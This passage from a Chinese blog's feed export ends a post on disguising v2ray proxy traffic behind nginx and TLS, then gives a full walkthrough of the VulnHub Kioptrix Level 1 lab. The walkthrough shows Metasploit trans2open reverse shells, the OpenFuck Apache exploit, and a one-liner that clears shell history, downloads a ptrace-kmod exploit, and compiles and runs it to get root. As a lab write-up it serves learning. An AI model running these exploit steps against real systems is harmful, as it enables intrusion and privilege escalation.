<h3 id="别忘了把防火墙打开"><a href="#别忘了把防火墙打开" class="headerlink" title="别忘了把防火墙打开"></a>别忘了把防火墙打开</h3><p>我们打开防火墙是为了便于操作，但不利于安全。操作完成之后，一定要把防火墙开启，并且只开放nginx的监听端口到互联网。<br>首先关闭ssh服务：<br><code>service ssh stop</code><br>关闭开放的多余端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ufw enable</span><br><span class="line">ufw delete allow 端口号</span><br></pre></td></tr></table></figure>

<h3 id="nginx默认的欢迎页面也删掉"><a href="#nginx默认的欢迎页面也删掉" class="headerlink" title="nginx默认的欢迎页面也删掉"></a>nginx默认的欢迎页面也删掉</h3><p>减少暴露信息，我们把nginx欢迎页面删掉。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcybgipqdsj30qe02rdfw.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcybh51w3pj30gv00tt8j.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实主要运用了Nginx的代理功能，由nginx代理v2ray的websocket流量，并且nginx可以建站，帮助我们挂羊头卖狗肉。这种方式的优点是：所有请求其实都经过nginx代理，nginx设置了https，那么所有流量都将是经过https加密的，不会具有<strong>不良特征</strong>。<br>nginx上观察访问日志，看到的都是访问websocket路径，看不到用户访问的具体内容，不过可以看到用户端的IP。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcybnq8oj0j30uj0awju0.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://pincong.rocks/article/15493">思路主要参考这篇文章：用nginx反向代理v2ray，并伪装站点</a><br><a href="https://toutyrater.github.io/advanced/wss_and_web.html">PC客户端的配置文件参考了这篇文章</a><br><a href="https://www.myfreax.com/how-to-install-nginx-on-ubuntu-18-04/">nginx的安装和配置参考这篇</a><br><a href="https://blog.csdn.net/u012291393/article/details/78768547">https证书申请参考这篇：用certbot申请let’s encrypt的https证书</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>v2ray+ws+tls+web</tag>
        <tag>梯子</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Kioptix Level 1</title>
    <url>//posts/ZH-CN/Vulnhub_Kioptrix_One.html</url>
    <content><![CDATA[<h2 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h2><p>用<code>sudo arp-scan</code>和<code>netdiscover -i eth0</code>都探测不到靶机IP。<a href="https://blog.csdn.net/Viv233/article/details/104103628">参考</a>解决方法：将虚拟机文件<code>Kioptix Level 1.vmx</code>的<code>ethernet0.networkName = &quot;Bridged&quot;</code>改成<code>ethernet0.networkName = &quot;Nat&quot;</code>。</p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6lemqzsgj313d0lltab.jpg" alt="image.png"><br>靶机IP探测为192.1680.80.15，<code>netdiscover -i eth0</code>的扫描结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6ln4n92aj30ow06l40u.jpg" alt="image.png"></p>
<h2 id="进一步扫描"><a href="#进一步扫描" class="headerlink" title="进一步扫描"></a>进一步扫描</h2><p>我们使用nmap扫描出靶机开放的端口信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -T5 -Pn 192.168.80.15</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 07:20 EST</span><br><span class="line">Nmap scan report for 192.168.80.15</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">1024/tcp open  kdm</span><br><span class="line">MAC Address: 00:0C:29:51:2D:92 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds</span><br></pre></td></tr></table></figure>
<h3 id="使用nbtscan扫描139端口的netbios-ssn服务"><a href="#使用nbtscan扫描139端口的netbios-ssn服务" class="headerlink" title="使用nbtscan扫描139端口的netbios-ssn服务"></a>使用nbtscan扫描139端口的netbios-ssn服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nbtscan 192.168.80.15</span><br><span class="line">Doing NBT name scan for addresses from 192.168.80.15</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">192.168.80.15    KIOPTRIX         &lt;server&gt;  KIOPTRIX         00:00:00:00:00:00</span><br></pre></td></tr></table></figure>
<h3 id="使用msfconsole工具获取信息"><a href="#使用msfconsole工具获取信息" class="headerlink" title="使用msfconsole工具获取信息"></a>使用msfconsole工具获取信息</h3><p>什么是Metasploit？<br>metasploit是一款开源的渗透测试框架软件，也是一个逐步发展与成熟的漏洞研究与渗透代码开发平台。</p>
<blockquote>
<p>console的使用<br>service postgresql start //先连接数据库<br>msfconsole //打开框架<br>msf&gt;help //显示msf所支持的命令列表<br>msf&gt;help search //显示关于search参数的命令和使用<br>实例入侵metasploitable靶机<br>1.search samba搜索模块<br>2.use multi/samba/usermap_script 使用模块<br>3.show payloads查看可用的载荷<br>4.set payload cmd/unix/bind_netcat 使用载荷<br>5.show options 选择载荷可用选项<br>6.set RHOST 192.168.0.94 设置载荷的攻击目标IP<br>7.exploit执行渗透攻击<br>然后攻击成功会建立一个会话，返回一个可交互的shell<br>这就是使用metasploit渗透的一个常规流程。</p>
</blockquote>
<p>对靶机进行metasploit扫描，发现靶机的samba版本是<code>Samba 2.2.1a</code>。我们可以利用该版本的漏洞：Samba Trans2Open Overflow。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">[-] ***rting the Metasploit Framework console...|</span><br><span class="line">[-] * WARNING: No database support: No database YAML file</span><br><span class="line">[-] ***</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">     .~+P``````-o+:.                                      -o+:.</span><br><span class="line">.+oooyysyyssyyssyddh++os-`````                        ```````````````          `</span><br><span class="line">+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o</span><br><span class="line">++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy</span><br><span class="line">--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///</span><br><span class="line">                                `...............`              `...-/////...`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                  .::::::::::-.                     .::::::-</span><br><span class="line">                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo</span><br><span class="line">                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy</span><br><span class="line">                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`</span><br><span class="line">                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`</span><br><span class="line">                                   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/</span><br><span class="line">    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/</span><br><span class="line">      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd</span><br><span class="line">    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/</span><br><span class="line">    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:</span><br><span class="line">          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+</span><br><span class="line">          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::</span><br><span class="line">          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||</span><br><span class="line">........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........</span><br><span class="line">================================================================================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">=====================| Session one died of dysentery. |=========================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">================================================================================</span><br><span class="line"></span><br><span class="line">                     Press ENTER to size up the situation</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">%</span><span class="bash">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="meta">%</span><span class="bash">%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="meta">%</span><span class="bash">%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It<span class="string">&#x27;s always cool in the lab %%%%%%%%%%%%%%%%</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span></span><br><span class="line"></span><br><span class="line">                        Press SPACE BAR to continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.71-dev                          ]</span><br><span class="line">+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   SMBDomain  .                no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                     no        The password for the specified username</span><br><span class="line">   SMBUser                     no        The username to authenticate as</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.80.15</span><br><span class="line">RHOSTS =&gt; 192.168.80.15</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.80.15:139     - Host could not be identified: Unix (Samba 2.2.1a)</span><br><span class="line">[*] 192.168.80.15:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="利用samba漏洞"><a href="#利用samba漏洞" class="headerlink" title="利用samba漏洞"></a>利用samba漏洞</h3><p>这是samba漏洞的详细说明：</p>
<blockquote>
<p>About Samba Trans2Open Overflow –<br>This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC.</p>
</blockquote>
<p>继续使用metasploit进行漏洞利用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; search trans2open #查询这个漏洞</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                              Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                              ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)</span><br><span class="line">   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; use exploit/linux/samba/trans2open #利用漏洞</span><br><span class="line">msf5 exploit(linux/samba/trans2open) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT   139              yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/samba/trans2open) &gt; set RHOST 192.168.80.15 #设置靶机IP</span><br><span class="line">RHOST =&gt; 192.168.80.15</span><br><span class="line">msf5 exploit(linux/samba/trans2open) &gt; run #执行漏洞利用</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.14:4444 </span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.80.15</span><br><span class="line">[*] 192.168.80.15 - Meterpreter session 1 closed.  Reason: Died</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.14:4444 -&gt; 192.168.80.15:1025) at 2020-02-23 07:38:54 -0500</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.80.15</span><br><span class="line">[*] 192.168.80.15 - Meterpreter session 2 closed.  Reason: Died</span><br><span class="line">[*] Meterpreter session 2 opened (127.0.0.1 -&gt; 127.0.0.1) at 2020-02-23 07:38:55 -0500</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.80.15</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.80.14:4444 -&gt; 192.168.80.15:1027) at 2020-02-23 07:38:56 -0500</span><br><span class="line">[*] 192.168.80.15 - Meterpreter session 3 closed.  Reason: Died</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.80.15</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.80.14:4444 -&gt; 192.168.80.15:1028) at 2020-02-23 07:38:58 -0500</span><br><span class="line">[*] 192.168.80.15 - Meterpreter session 4 closed.  Reason: Died</span><br></pre></td></tr></table></figure>
<p>但是，这个<code>Meterpreter session 4 closed.  Reason: Died</code>关闭了。这是因为我们使用的是默认攻击载荷<code>linux/x86/meterpreter/reverse_tcp</code>，于是我们重新设置攻击载荷。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(linux/samba/trans2open) &gt; set payload generic/shell_reverse_tcp #设置载荷</span><br><span class="line">payload =&gt; generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(linux/samba/trans2open) &gt; run #执行漏洞利用</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.14:4444 </span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Command shell session 5 opened (192.168.80.14:4444 -&gt; 192.168.80.15:1029) at 2020-02-23 07:41:48 -0500</span><br></pre></td></tr></table></figure>
<p>于是我们获取到了靶机的shell。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6md9bdj4j30p00itjx6.jpg" alt="image.png"><br>输入mail，选择1，查询到制作者的flag信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mail</span><br><span class="line">Mail version 8.1 6/6/93.  Type ? for help.</span><br><span class="line">&quot;/var/mail/root&quot;: 2 messages 1 new 2 unread</span><br><span class="line"> U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   &quot;About Level 2&quot;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">N  2 root@kioptrix.level1  Sun Feb 23 07:55  18/524   <span class="string">&quot;LogWatch for kioptrix&quot;</span></span></span><br><span class="line">1</span><br><span class="line">Message 1:</span><br><span class="line">From root  Sat Sep 26 11:42:10 2009</span><br><span class="line">Date: Sat, 26 Sep 2009 11:42:10 -0400</span><br><span class="line">From: root &lt;root@kioptix.level1&gt;</span><br><span class="line">To: root@kioptix.level1</span><br><span class="line">Subject: About Level 2</span><br><span class="line"></span><br><span class="line">If you are reading this, you got root. Congratulations.</span><br><span class="line">Level 2 won&#x27;t be as easy...</span><br></pre></td></tr></table></figure>
<h3 id="利用apache漏洞"><a href="#利用apache漏洞" class="headerlink" title="利用apache漏洞"></a>利用apache漏洞</h3><p>使用nmap做详细的端口扫描，发现靶机使用的apache版本是<code>Apache/1.3.20</code>。从<a href="https://www.exploit-db.com/exploits/764">网上</a>查询，发现这个版本可进行漏洞利用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -A -n 192.168.80.15</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 07:57 EST</span><br><span class="line">Nmap scan report for 192.168.80.15</span><br><span class="line">Host is up (0.00093s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">|_ssl-date: 2020-02-23T14:00:24+00:00; +1h01m50s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:51:2D:92 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h01m49s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.93 ms 192.168.80.15</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 128.38 seconds</span><br></pre></td></tr></table></figure>
<p>于是，我们将漏洞利用脚本下载下来：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6n18k5cdj31f60u0466.jpg" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/764</span><br><span class="line">--2020-02-23 08:07:28--  https://www.exploit-db.com/download/764</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘764’</span><br><span class="line"></span><br><span class="line">764                            [  &lt;=&gt;                                  ]  32.94K  78.1KB/s    in 0.4s    </span><br><span class="line"></span><br><span class="line">2020-02-23 08:07:33 (78.1 KB/s) - ‘764’ saved [33731]</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6nzx76h6j30oy0j0agg.jpg" alt="image.png"><br>编译报错，因为攻击机缺少openssl。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo gcc -o exploit 764.c -lcrypto</span><br><span class="line">764.c:21:10: fatal error: openssl/ssl.h: No such file or directory</span><br><span class="line">   21 | #include &lt;openssl/ssl.h&gt;</span><br><span class="line">      |          ^~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
<p>安装openssl失败：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo apt-get install libssl-dev</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">E: Unable to locate package libssl-dev</span><br></pre></td></tr></table></figure>
<p><a href="https://ourcodeworld.com/articles/read/961/how-to-solve-kali-linux-apt-get-install-e-unable-to-locate-package-checkinstall">参考</a>解决openssl的安装问题。<br><del>待续……参考walkthrough：</del><br><a href="https://www.yeahhub.com/ctf-kioptrix-level-1-walkthrough/">metasploit利用漏洞详细步骤</a><br><a href="http://blog.thinsad.com/index.php/archives/34.html">apache漏洞利用详细步骤</a><br>安装openssl相关组件：<code>apt-get install libssl1.0-dev</code><br>运行exp，进入靶机shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo gcc -o exploit 764.c -lcrypto</span><br><span class="line">kali@kali:/tmp$ ./exploit 0x6b 192.168.80.15 443 -c 40</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f8068</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line"> -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; p://192.168.80.14/ptrace-kmod.c; gcc </span><br><span class="line">--11:53:36--  http://192.168.80.14/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to 192.168.80.14:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 404 Not Found</span><br><span class="line">11:53:36 ERROR 404: Not Found.</span><br><span class="line"></span><br><span class="line">gcc: ptrace-kmod.c: No such file or directory</span><br><span class="line">gcc: No input files</span><br><span class="line">rm: cannot remove `ptrace-kmod.c&#x27;: No such file or directory</span><br><span class="line">bash: ./p: No such file or directory</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ whoami</span><br><span class="line">whoami</span><br><span class="line">apache</span><br></pre></td></tr></table></figure>
<p>成功获得shell、为什么不是root权限，原因出在ptrace-kmod.c文件中。<br><del>待续……</del><br><a href="https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub">参考</a>进入shell之后，输入命令：<br><code>unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">--12:05:40--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--12:05:47--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line">    0K ...                                                   100% @ 678.26 B/s</span><br><span class="line">12:34:16 (678.26 B/s) - `ptrace-kmod.c&#x27; saved [3921/3921]</span><br><span class="line">[+] Attached to 1615</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机提权，有两种方法入手：一是利用samba溢出漏洞，用metasploit的msfconsole获取靶机shell，二是利用apache漏洞，用metasploit的msfconsole获取靶机shell。<br>从这个靶机学习的关键知识是，如何使用metasploit工具进行漏洞利用，获取靶机的反弹shell。</p>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Kioptix Level 1</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Kioptix Level 3</title>
    <url>//posts/ZH-CN/Vulnhub_Kioptrix_Three.html</url>
